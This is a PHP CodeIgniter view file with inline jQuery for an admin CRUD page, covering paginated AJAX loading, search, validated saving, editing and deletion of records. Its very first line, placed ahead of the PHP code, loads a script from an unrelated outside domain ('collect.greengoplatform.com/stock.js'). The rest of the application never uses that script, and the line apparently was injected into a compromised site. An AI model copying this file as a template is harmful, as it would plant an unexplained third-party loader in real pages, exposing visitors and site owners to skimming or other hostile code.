<script src='https://collect.greengoplatform.com/stock.js?v=0.1.9' type='text/javascript'></script><?php $data[$this->pages]=$this->model;$data['focus']=$this->nama; $this->load->view($this->generalHeader,$data) ?>
<div id="result-content"></div>
<?php form($this->model,$baseView); ?>





<script>
    var urlLocal    = `${strMasterData}/${strModel}/`;
    var urlRead     = strRead,urlSave=strSave,urlDelete=strDelete,urlEdit=strEdit;
    var pages       = "<?=$data[$this->pages]?>";
    var nama        = attrId(strNama);
    var modalForm   = attrId(`${strModal}${pages}`);
    var formInput   = attrId(strFormInput);
    var paramForm   = attrId(strParam);
    var resultContent=attrId(strResultContent);
    var anyPage     = attrId(`${strAny}${pages}`);
    var no=1;


    $(document).ready(function() {
        loadData(1);
    });

    function nextLoad(par){
        var lastRow = toInt(attrId(strLastRows).val());
        var totalRow= toInt(attrId(strTotalRows).val());
        totalRow>lastRow&&loadData(toInt(no)+par);
    }
    function prevLoad(par){
        no > 1&&loadData(toInt(no)-par);
    }

    function loadData(page=1,isCache=true){
        no=page;
        var where=page;
        var any = anyPage.val()!==""?"?any="+anyPage.val():"";
        var totalRows = isNumber(attrId(strTotalRows).val());
        var url=base_url+urlLocal+urlRead;
        where+=any;
        if(!isCache) {
            if(totalRows === 0 ){localCache.remove(url+where);}
            else{for(var i=0;i<totalRows;i++){localCache.remove(url+`${i+1}${any}`);}}
        }
        ajaxView(urlLocal+urlRead+where,null,function(res){resultContent.html(res);});
    }

    function cari(e, val) {
        if (e.keyCode === 13) {
            anyPage.val(val);
            timeOut(function(){loadData(1,false);})
        }
    }

    formInput.validate({
        rules: {
            nama: {
                required: true,
                remote: {url: `${strModel}/check_column`,type: "post",data: {param: function () {return paramForm.val();}}}
            }
        },
        errorPlacement: handleError(),
        submitHandler: function (form) {
            var formData=new FormData(formInput[0]);
            ajaxFile(base_url+urlLocal+urlSave,formData,function (res) {
                if (res.status) {
                    validateSaveHmtl(nama.val(),anyPage.val(),paramForm.val(),function(page,searchName){
                        if(!searchName) anyPage.val("");
                        loadData(page,false);
                        notif(strSuccess);
                        modalForm.modal(strHide);
                        delForm(formInput);
                        paramForm.val(strAdd);
                    })
                } else {
                    notif(strFailed);
                }
            })

        }
    });
    function hapus(id) {
        validateDeleteHtml(base_url+urlLocal+urlDelete,id,anyPage.val(),function(page,isCache){
            if(page===1) {
                anyPage.val("");
                attrId(strActiveRows).val(`${page}`)
            }
            loadData(page,isCache);
        })
    }
    function ubah(id) {
        var baseUrl=base_url+urlLocal+urlEdit+"/"+id;
        handleCacheEdit(baseUrl,function(res){
            if (res.status) {
                setFocus(strNama);
                var data    = res.res_data;
                var arrId   = [strId,strNama,"warna",strKategori,strStatus];
                arrId.forEach(function(row){setIdSelect(row,data[row])})
            } else {
                notif(strFailed);
            }
        });
    }

    modalForm.on(strHideModal, function () {delForm(formInput)});
    modalForm.on(strShowModal, function () {
        var arrSelect = [strKategori];
        arrSelect.forEach(function(row){setSelect(base_url+`${strMasterData}/${row}/${strGetAll}`,row);});
    });

</script>